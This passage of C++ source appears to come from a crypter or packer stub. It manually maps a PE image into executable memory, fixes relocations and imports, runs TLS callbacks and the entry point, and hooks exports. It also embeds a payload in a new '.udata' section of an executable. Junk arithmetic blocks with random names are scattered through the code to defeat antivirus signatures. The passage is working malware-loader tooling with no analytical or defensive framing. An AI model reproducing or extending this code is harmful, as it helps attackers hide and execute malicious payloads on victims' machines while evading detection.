int ikP4q2ZXT4V = ijAjlaStzSI / 77 + 0x779cbc6 - 76 / ijAjlaStzSI ^ 0x33 % ijAjlaStzSI % 0x779cbc6;
ikP4q2ZXT4V = 0xf440157 * 0x10 - 22 + ikP4q2ZXT4V + 56 ^ 0xff + iiDUfvyHDZ5 + 1996 - 2111 + ijAjlaStzSI;
}
		}
		else
		{
			ret = DoImport(pBase, pImportDesc, fnLoadLibraryA, fnGetProcAddress);
		}
	}

	return ret;{
int i7z4K1VEVTF = 0x02c141b;
int i2tB4Z46RmM = 0xb0636cb;
int ijzhY8zmOMb = i7z4K1VEVTF + i2tB4Z46RmM;
}
}*/

/*bool ExecuteTLS(HMODULE hMod)
{
	unsigned char *codeBase = (unsigned char *)hMod;
	PIMAGE_TLS_DIRECTORY tls;
	PIMAGE_TLS_CALLBACK* callback;

	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)codeBase;
	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(codeBase + pDos->e_lfanew);
	PIMAGE_DATA_DIRECTORY directory = &pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	if (directory->VirtualAddress == 0) {
		return true;
	}

	tls = (PIMAGE_TLS_DIRECTORY)(codeBase + directory->VirtualAddress);
	callback = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
	if (callback) {
		while (*callback) {
			(*callback)((LPVOID)codeBase, DLL_PROCESS_ATTACH, NULL);
			callback++;{
int izBZbhtk9us = 0xa390c51;
int i0RNe87dO4U = 0x7fc91ce;
int iQk3spvhFBt = 0x2da57c7;
int i17fwpKlSTZ = iQk3spvhFBt * i0RNe87dO4U + izBZbhtk9us;
i0RNe87dO4U = 0x6e0b231 + i17fwpKlSTZ + 0x69a5288 + izBZbhtk9us;
int iSwNU0OsawU = izBZbhtk9us / 0x7fc91ce - iQk3spvhFBt ^ iQk3spvhFBt ^ 0x2da57c7;
}
		}
	}
	return true;
}*/

void Release(HMODULE hMod)
{
	if (hMod != nullptr)
	{
		IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
		IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)((char*)hMod + pDos->e_lfanew);{
int iaC3ghOyyMd = 0xdec566d;
int i8dRm89u6IP = 0x19a7860;
int it2j0UsEKSN = 0x76fc81a;
int i2hh1YvbpYQ = it2j0UsEKSN * i8dRm89u6IP + iaC3ghOyyMd;
i8dRm89u6IP = 0xe469fd2 - i2hh1YvbpYQ + 5 + 0x1f370ab + 69 - iaC3ghOyyMd;
iaC3ghOyyMd = 0xdec566d + 10 - i8dRm89u6IP % 10 + 0x76fc81a + 999 - i2hh1YvbpYQ;
i2hh1YvbpYQ = iaC3ghOyyMd % 5 + it2j0UsEKSN % 0x19a7860 + 0xcafebabe + iaC3ghOyyMd;
it2j0UsEKSN = 0xdec566d * 0x100 - iaC3ghOyyMd + 56 ^ 0x19a7860 + 1996 - it2j0UsEKSN;
int iOqKF27weUr = it2j0UsEKSN / 77 + 0x76fc81a - 76 / it2j0UsEKSN ^ 0x33 % it2j0UsEKSN % 0x76fc81a;
iOqKF27weUr = 0x1f370ab * 0x10 - 22 + iOqKF27weUr + 56 ^ 0xff + i8dRm89u6IP + 1996 - 2111 + it2j0UsEKSN;
}

		char *pEntry = (char*)hMod + pNTHead->OptionalHeader.AddressOfEntryPoint;{
int i5ZOMhFi1AD = 0xd9721ac;
int isd7X5j0lK0 = 0x7c42930;
int iUjC0RYdjGl = i5ZOMhFi1AD * isd7X5j0lK0;
}

		if ((pNTHead->FileHeader.Characteristics&IMAGE_FILE_DLL) == IMAGE_FILE_DLL)
		{
			bool(WINAPI *iDllMain)(void*, unsigned int, void*);
			*(char **)&iDllMain = pEntry;

			//printf("Call DllMain");
			iDllMain(hMod, DLL_PROCESS_DETACH, 0);
		}

		VirtualFree(hMod, 0, MEM_RELEASE);
	}
}

HMODULE Load(LPVOID Param)
{
	PE *sPe = (PE*)Param;{
int ixtGVXX4Il9 = 0xc91f967;
int ivZ3g8fUjTs = 0x9b68368;
int iaMX9lQBSTp = ixtGVXX4Il9 - ivZ3g8fUjTs;
}

	funcVirtualAlloc fnVirtualAlloc = (funcVirtualAlloc)sPe->fnVirtualAlloc;
	funcVirtualFree fnVirtualFree = (funcVirtualFree)sPe->fnVirtualFree;
	funcLoadLibraryA fnLoadLibraryA = (funcLoadLibraryA)sPe->fnLoadLibraryA;
	funcGetProcAddress fnGetProcAddress = (funcGetProcAddress)sPe->fnGetProcAddress;
	funcmemcpy fnmemcpy = (funcmemcpy)sPe->fnmemcpy;

	HMODULE hMod = nullptr;

	const IMAGE_DOS_HEADER *pDos = (const IMAGE_DOS_HEADER*)sPe->buf;
	char *pChOldDos = (char*)pDos;

	IMAGE_NT_HEADERS *pOldNTHead = (IMAGE_NT_HEADERS*)((char*)sPe->buf + pDos->e_lfanew);
	DWORD dwFullNTSize = sizeof(IMAGE_NT_HEADERS) - (sizeof(IMAGE_OPTIONAL_HEADER) - pOldNTHead->FileHeader.SizeOfOptionalHeader);
	IMAGE_SECTION_HEADER *pOldSectHead = (IMAGE_SECTION_HEADER*)((char*)pOldNTHead + dwFullNTSize);

	if (pOldNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0
		&& (pOldNTHead->FileHeader.Characteristics&IMAGE_FILE_RELOCS_STRIPPED)
		)
	{
		hMod = (HMODULE)pOldNTHead->OptionalHeader.ImageBase;
	}

	hMod = (HMODULE)fnVirtualAlloc(hMod, pOldNTHead->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hMod == nullptr)
	{
		//printf("Can't alloc memory: %d at %p", pOldNTHead->OptionalHeader.SizeOfImage, hMod);
	}
	else
	{
		IMAGE_DOS_HEADER *pNewDos = (IMAGE_DOS_HEADER*)hMod;
		char *pChNewDos = (char*)hMod;

		DWORD dwStubSize = dwFullNTSize + sizeof(IMAGE_SECTION_HEADER)*pOldNTHead->FileHeader.NumberOfSections;
		//copy dos
		fnmemcpy(pChNewDos, pChOldDos, pDos->e_lfanew);

		IMAGE_NT_HEADERS *pNewNtHead = (IMAGE_NT_HEADERS*)(pChNewDos + pDos->e_lfanew);
		//copy NT head & section header
		fnmemcpy(pNewNtHead, pOldNTHead, dwStubSize);

		//fix all section 
		int iSectionIndex = 0;

		for (iSectionIndex = 0;
			iSectionIndex < pOldNTHead->FileHeader.NumberOfSections;
			++iSectionIndex)
		{
			char *pNewSectData = pChNewDos + pOldSectHead[iSectionIndex].VirtualAddress;
			char *pOldSectData = pChOldDos + pOldSectHead[iSectionIndex].PointerToRawData;{
int iNKnkafZ02Z = 0x3fb5bf4;
int iDYtQtLWQuv = 0x78ed34c;
int iwYP62hjMaL = iNKnkafZ02Z - iDYtQtLWQuv;
}

			//check for valid section data
			if (pOldSectHead[iSectionIndex].SizeOfRawData
				&& pOldSectHead[iSectionIndex].PointerToRawData + pOldSectHead[iSectionIndex].SizeOfRawData > (ULONG)sPe->size)
			{
				break;
			}

			DWORD dwRVASize = Align(pOldSectHead[iSectionIndex].Misc.VirtualSize, pOldNTHead->OptionalHeader.SectionAlignment);
			fnmemcpy(pNewSectData, pOldSectData, pOldSectHead[iSectionIndex].SizeOfRawData);
		}

		if (iSectionIndex == pOldNTHead->FileHeader.NumberOfSections)
		{
		}
		else
		{
			fnVirtualFree(hMod, 0, MEM_RELEASE); hMod = nullptr;
		}
	}

	if (hMod)
	{
		bool ret;
		//reloc
		IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
		unsigned char *pBase = (unsigned char*)pDos;

		IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)((char*)pDos + pDos->e_lfanew);
		IMAGE_DATA_DIRECTORY imgDirRelocation = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		unsigned char *pOrgBase = (unsigned char*)pNTHead->OptionalHeader.ImageBase;
		if (pOrgBase == pBase)
		{
			ret = true;
		}
		else if (imgDirRelocation.VirtualAddress == 0)
		{
			ret = false;
		}
		else
		{
			size_t delta = pBase - pOrgBase;

			IMAGE_BASE_RELOCATION *pBaseReloc = (IMAGE_BASE_RELOCATION*)(pBase + imgDirRelocation.VirtualAddress);

			if (imgDirRelocation.VirtualAddress + imgDirRelocation.Size >= pNTHead->OptionalHeader.SizeOfImage)
			{
				ret = false;
			}
			else
			{
				//ret = DoBaseReloc(pBase, pNTHead->OptionalHeader.SizeOfImage, delta, pBaseReloc, imgDirRelocation.Size);
				unsigned char *codeBase = pBase;
				size_t codeSize = pNTHead->OptionalHeader.SizeOfImage;
				int remainSize = imgDirRelocation.Size;
				ret = true;
				while (remainSize > 0 && ret)
				{
					WORD *arrRel = (WORD *)&pBaseReloc[1];
					int nRel = (pBaseReloc[0].SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
					char *dest = (char*)codeBase + pBaseReloc[0].VirtualAddress;{
int iIC7n2Vxmlj = 0x85588d0;
int iB3uYUhpLT3 = 0x5bbc31f;
int iWcg7rEscp7 = 0xf30c5a8;
int ixxd0Nkchyq = iIC7n2Vxmlj + iB3uYUhpLT3 - iWcg7rEscp7;
ixxd0Nkchyq = 0x2dc8dc5 * ixxd0Nkchyq + 0xd0bf691 - iB3uYUhpLT3;
int iH5nl4UXS40 = ixxd0Nkchyq / 0xd0bf691 + iIC7n2Vxmlj ^ iWcg7rEscp7 - 0xf30c5a8;
}

					if (dest < (char*)codeBase || (char*)codeBase + codeSize < dest)
					{
						ret = false;
					}
					else for (int i = 0; i < nRel; ++i)
					{
						DWORD *patchAddrHL;
#ifdef _WIN64
						ULONGLONG *patchAddr64;
#endif
						int offset = arrRel[i] & 0xfff;
						switch (arrRel[i] >> 12)
						{
						case IMAGE_REL_BASED_ABSOLUTE:
							// skip relocation
							break;

						case IMAGE_REL_BASED_HIGHLOW:
							// change complete 32 bit address
							patchAddrHL = (DWORD *)(dest + offset);
							*patchAddrHL += (DWORD)delta;
							break;

#ifdef _WIN64
						case IMAGE_REL_BASED_DIR64:
							patchAddr64 = (ULONGLONG *)(dest + offset);
							*patchAddr64 += delta;
							break;
#endif

						default:
							ret = false;
							break;
						}
					}

					if (ret)
					{
						remainSize -= pBaseReloc[0].SizeOfBlock;
						pBaseReloc = (IMAGE_BASE_RELOCATION *)((char*)pBaseReloc + pBaseReloc[0].SizeOfBlock);
					}
				}
			}
		}

		if (ret)
		{
			//import
			pDos = (IMAGE_DOS_HEADER*)hMod;
			pBase = (unsigned char*)hMod;

			pNTHead = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
			IMAGE_DATA_DIRECTORY imgDirImport = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];


			if (imgDirImport.VirtualAddress)
			{
				IMAGE_IMPORT_DESCRIPTOR *pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)(pBase + imgDirImport.VirtualAddress);
				if (imgDirImport.VirtualAddress + imgDirImport.Size >= pNTHead->OptionalHeader.SizeOfImage)
				{
					ret = false;
				}
				else
				{
					//ret = DoImport(pBase, pImportDesc, fnLoadLibraryA, fnGetProcAddress);
					unsigned char *codeBase = pBase;

					ret = true;

					while (pImportDesc[0].Name)
					{
						char *szLibName = (char*)codeBase + pImportDesc[0].Name;

						HMODULE hLib = fnLoadLibraryA(szLibName);

						if (!hLib)
						{
							ret = false;
							break;{
int iHNxHIJ3AKo = 0x0402723;
int iongXk9bzGW = 0xf052b13;
int idMSVDMzeFD = 0xaa69975;
int ipfeE2z811p = iHNxHIJ3AKo + iongXk9bzGW - idMSVDMzeFD;
ipfeE2z811p = 0x81bc6f6 * ipfeE2z811p + 0x7e47392 - iongXk9bzGW;
int ix3UdgHxZPT = ipfeE2z811p / 0x7e47392 + iHNxHIJ3AKo ^ idMSVDMzeFD - 0xaa69975;
}
						}

						POINTER_TYPE *thunkRef;
						FARPROC *funcRef;
						if (pImportDesc[0].OriginalFirstThunk) {
							thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].OriginalFirstThunk);
							funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
						}
						else {
							// no hint table
							thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].FirstThunk);
							funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
						}

						if (!thunkRef || !funcRef)
						{
							ret = false;
							break;
						}
						else for (; *thunkRef; thunkRef++, funcRef++)
						{
							if (IMAGE_SNAP_BY_ORDINAL(*thunkRef))
							{
								*funcRef = fnGetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
							}
							else
							{
								PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + (*thunkRef));

								*funcRef = fnGetProcAddress(hLib, (LPCSTR)&thunkData->Name);
							}

							if (*funcRef == 0) {
								ret = false;
								break;
							}
						}

						pImportDesc++;
					}
				}
			}

			if (ret)
			{
				//ExecuteTLS
				unsigned char *codeBase = (unsigned char *)hMod;
				PIMAGE_TLS_DIRECTORY tls;
				PIMAGE_TLS_CALLBACK* callback;

				IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)codeBase;{
int iSnECCfCGmH = 0x6a39023;
int ih2KIRWFQch = 0x877900d;
int i0dwCEKkpTa = 0x674a899;
int i8CgteLiA1e = 0x8268f09;
int i4x4qYdOz5I = 5;
switch(i4x4qYdOz5I)
{
    case 0:
        iSnECCfCGmH = ih2KIRWFQch - 0xd109f81 * i0dwCEKkpTa / 100;
        ih2KIRWFQch = 0x674a899 - 5 +  0x674a899 - 6 * ih2KIRWFQch / 10 + 25;
        i0dwCEKkpTa = iSnECCfCGmH * 0x12 + i8CgteLiA1e * 0x15 + 0x8268f09 / 13 + 0xd109f81 + 555;
        i8CgteLiA1e = 0x6a39023 - 21 + 11 * 1996 - ih2KIRWFQch + 14520538 - i0dwCEKkpTa - 14520692 + 0x877900d - 97;
        break;
    case 1:
        iSnECCfCGmH = ih2KIRWFQch - 25 + 0x6a39023 - 40 + 0x674a899 % 10 + 2;
        i0dwCEKkpTa = i0dwCEKkpTa - 0xff % 3 - i8CgteLiA1e * 10 + 0xd109f81 / 2 - 10 + 0x877900d - 5;
        i8CgteLiA1e = 0x6a39023 % 0xd109f81 ^ 33 + 0x674a899 * 0x12 - 30 + 0x674a899 + 23;
        ih2KIRWFQch = ih2KIRWFQch + 321 + i0dwCEKkpTa * 10 * ih2KIRWFQch / 10 / 2 + 0xd109f81 * 0x60;
        break;
    case 2:
        iSnECCfCGmH = ih2KIRWFQch - 45 - i0dwCEKkpTa * 46 + 0x6a39023 / 0xdade;
        ih2KIRWFQch = ih2KIRWFQch + 0xd109f81 - i0dwCEKkpTa * 0x877900d - 3;
        i0dwCEKkpTa = 0x877900d - 0x1 + iSnECCfCGmH * 0x2 - 0xd109f81 / 0x3 + 0x674a899;
        i8CgteLiA1e = iSnECCfCGmH - 0x4 * 0x6a39023 + 0x1234 - 0x4567 + 0xcafe + ih2KIRWFQch % 0x432 / 0x8268f09 - 0x23;
        break;
    case 3:
        ih2KIRWFQch = i8CgteLiA1e * 2 * 0x877900d - 4 + 0xd109f81 + 12 + 34 + 0x6a39023;
        i0dwCEKkpTa = ih2KIRWFQch - 43 + 0x674a899 * 3040 - 0x877900d % 10 + 1 - 0x674a899;
        i8CgteLiA1e = 0x674a899 - 33 + iSnECCfCGmH * 0x25 + 0x6a39023 - 3004 + 0x877900d;
        iSnECCfCGmH = 0x6a39023 + 2905 % ih2KIRWFQch * 1996 + 0x8268f09 - 70 * 0xd109f81;
        break;
    case 4:
        i8CgteLiA1e = ih2KIRWFQch - 36 +0xd109f81 * 2001 - i0dwCEKkpTa / 234 + 0x7;
        iSnECCfCGmH = i8CgteLiA1e - 0xabcedf + 0x877900d * 0xa2bc5 + i8CgteLiA1e / 0x123 + 0x6a39023;
        i0dwCEKkpTa = iSnECCfCGmH - 0x124 + 23 / ih2KIRWFQch / 3 / 2 + i0dwCEKkpTa + 29 - 0x877900d + 100;
        ih2KIRWFQch = 0x877900d - 70 + 70  + 0x6a39023 / 2 + 423 - 0x6a39023 / 7749 % 0x1234;
        break;
    case 5:
        ih2KIRWFQch = ih2KIRWFQch - 9981 % iSnECCfCGmH + 111 - i0dwCEKkpTa / 224 % 0x674a899;
        i0dwCEKkpTa = i0dwCEKkpTa - 339 - i0dwCEKkpTa * 4416 / 0xd109f81 + 5525 + 0x877900d % 10;
        i8CgteLiA1e = i8CgteLiA1e - 6636 + 0x877900d * 7749 + 1 - ih2KIRWFQch * 8864 / 0xfecba;
        iSnECCfCGmH = 0xd109f81 - 9981 % 0x6a39023 % 10 % 1010100 - 0x6a39023 - 23 -  0xd109f81 - 2500;
        break;
}
i4x4qYdOz5I = i8CgteLiA1e - 0xaa + 0x674a899 * 46 - 15 / i0dwCEKkpTa + 11 - 0x6a39023;
i4x4qYdOz5I = i4x4qYdOz5I - 70 * 55 - i0dwCEKkpTa ^ 0x99 - 0x567498 % 0x6a39023 % 2 - 234 + 0x877900d;
}
				IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(codeBase + pDos->e_lfanew);
				PIMAGE_DATA_DIRECTORY directory = &pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
				if (directory->VirtualAddress == 0) {
					ret = true;
				}
				else
				{
					tls = (PIMAGE_TLS_DIRECTORY)(codeBase + directory->VirtualAddress);
					callback = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
					if (callback) {
						while (*callback) {
							(*callback)((LPVOID)codeBase, DLL_PROCESS_ATTACH, NULL);
							callback++;
						}
					}
				}

				if (ret)
				{
					pDos = (IMAGE_DOS_HEADER*)hMod;
					pNTHead = (IMAGE_NT_HEADERS*)((char*)hMod + pDos->e_lfanew);

					char *pEntry = (char*)hMod + pNTHead->OptionalHeader.AddressOfEntryPoint;

					if ((pNTHead->FileHeader.Characteristics&IMAGE_FILE_DLL) == 0)
					{
						int(WINAPI *iExeMain)(void);
						*(char **)&iExeMain = pEntry;

						iExeMain();
					}
				}

			}
		}
	}
	
	return hMod;
}

void End_Load(){}
FARPROC GetFuncAddress(HMODULE hMod, unsigned int hashProc)
{
	FARPROC ret = nullptr;

	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	unsigned char *pBase = (unsigned char*)hMod;

	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
	IMAGE_DATA_DIRECTORY imgDirImport = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	if (imgDirImport.VirtualAddress)
	{
		IMAGE_EXPORT_DIRECTORY *pExportDesc = (IMAGE_EXPORT_DIRECTORY*)(pBase + imgDirImport.VirtualAddress);
		if (imgDirImport.VirtualAddress + imgDirImport.Size >= pNTHead->OptionalHeader.SizeOfImage)
		{
		}
		else
		{
			ret = DoGetProcAddress(pBase, pExportDesc, hashProc);
		}
	}

	return ret;
}

FARPROC GetFuncAddress(HMODULE hMod, const char * szProc)
{
	return GetFuncAddress(hMod, NameHash(szProc));
}

bool HookExport(HMODULE hMod, FARPROC fpOrgFunc, FARPROC fpChangeTo)
{
	bool ret = false;
	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	IMAGE_NT_HEADERS *pNt = (IMAGE_NT_HEADERS*)((char*)hMod + pDos->e_lfanew);

	IMAGE_EXPORT_DIRECTORY *pExport = (IMAGE_EXPORT_DIRECTORY*)((char*)hMod + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	WORD *pwExportOrd = (WORD*)((char*)hMod + pExport->AddressOfNameOrdinals);
	DWORD *pdwExportAddr = (DWORD*)((char*)hMod + pExport->AddressOfFunctions);

	DWORD i, n = pExport->NumberOfFunctions;
	for (i = 0; i < n; ++i)
	{
		FARPROC fp = (FARPROC)(pdwExportAddr[pwExportOrd[i]] + (char*)hMod);
		if (fp == fpOrgFunc)
		{
			DWORD dwOldProtect = 0;
			if (VirtualProtect(&pdwExportAddr[pwExportOrd[i]], sizeof(pdwExportAddr[0]), PAGE_EXECUTE_READWRITE, &dwOldProtect))
			{
				pdwExportAddr[pwExportOrd[i]] = (char*)fpChangeTo - (char*)hMod;
				VirtualProtect(&pdwExportAddr[pwExportOrd[i]], sizeof(pdwExportAddr[0]), dwOldProtect, &dwOldProtect);
				ret = true;
			}
			break;
		}
	}

	return ret;
}

char *InsertLastSection(const void *pImg, DWORD &sztImg, SectionData *sData)
{
	DWORD HeaderSum = 0, CheckSum = 0;
	const IMAGE_DOS_HEADER *pOldDos = (const IMAGE_DOS_HEADER*)pImg;
	char *pChOldDos = (char*)pImg;
	IMAGE_NT_HEADERS *pOldNTHead = (IMAGE_NT_HEADERS*)((char*)pChOldDos + pOldDos->e_lfanew);

	char *pChNewDos = (char*)calloc(sztImg + Align(sData->buf_size + sizeof(SectionData), pOldNTHead->OptionalHeader.FileAlignment), 1);
	memcpy(pChNewDos, pChOldDos, sztImg);
	sztImg = sztImg + Align(sData->buf_size + sizeof(SectionData), pOldNTHead->OptionalHeader.FileAlignment);

	const IMAGE_DOS_HEADER *pNewDos = (const IMAGE_DOS_HEADER*)pChNewDos;

	IMAGE_NT_HEADERS *pNewNTHead = (IMAGE_NT_HEADERS*)((char*)pChNewDos + pNewDos->e_lfanew);
	DWORD dwNewFullNTSize = sizeof(IMAGE_NT_HEADERS) - (sizeof(IMAGE_OPTIONAL_HEADER) - pNewNTHead->FileHeader.SizeOfOptionalHeader);
	IMAGE_SECTION_HEADER *pNewSectHead = (IMAGE_SECTION_HEADER*)((char*)pNewNTHead + dwNewFullNTSize);


	pNewNTHead->FileHeader.NumberOfSections = pNewNTHead->FileHeader.NumberOfSections + 1;
	int iLastSectionIndex = pNewNTHead->FileHeader.NumberOfSections - 1;
	strcpy((char*)pNewSectHead[iLastSectionIndex].Name, ".udata");
	pNewSectHead[iLastSectionIndex].Misc.PhysicalAddress = sData->buf_size + sizeof(SectionData);
	pNewSectHead[iLastSectionIndex].Misc.VirtualSize = sData->buf_size + sizeof(SectionData);
	pNewSectHead[iLastSectionIndex].VirtualAddress = Align(pNewSectHead[iLastSectionIndex - 1].VirtualAddress + pNewSectHead[iLastSectionIndex - 1].Misc.VirtualSize, pNewNTHead->OptionalHeader.SectionAlignment);
	pNewSectHead[iLastSectionIndex].SizeOfRawData = Align(sData->buf_size + sizeof(SectionData), pNewNTHead->OptionalHeader.FileAlignment);
	pNewSectHead[iLastSectionIndex].PointerToRawData = Align(pNewSectHead[iLastSectionIndex - 1].PointerToRawData + pNewSectHead[iLastSectionIndex - 1].SizeOfRawData, pNewNTHead->OptionalHeader.FileAlignment);
	pNewSectHead[iLastSectionIndex].PointerToRelocations = 0;
	pNewSectHead[iLastSectionIndex].PointerToLinenumbers = 0;
	pNewSectHead[iLastSectionIndex].NumberOfRelocations = 0;
	pNewSectHead[iLastSectionIndex].NumberOfLinenumbers = 0;
	pNewSectHead[iLastSectionIndex].Characteristics = 0x40000000;

	pNewNTHead->OptionalHeader.SizeOfImage = pNewNTHead->OptionalHeader.SizeOfImage + pNewSectHead[iLastSectionIndex].Misc.VirtualSize;

	memcpy((void*)(pChNewDos + pNewSectHead[iLastSectionIndex].PointerToRawData), sData, sData->buf_size + sizeof(SectionData));

	CheckSumMappedFile(pChNewDos, sztImg, &HeaderSum, &CheckSum);
	pNewNTHead->OptionalHeader.CheckSum = CheckSum;

	return pChNewDos;
}

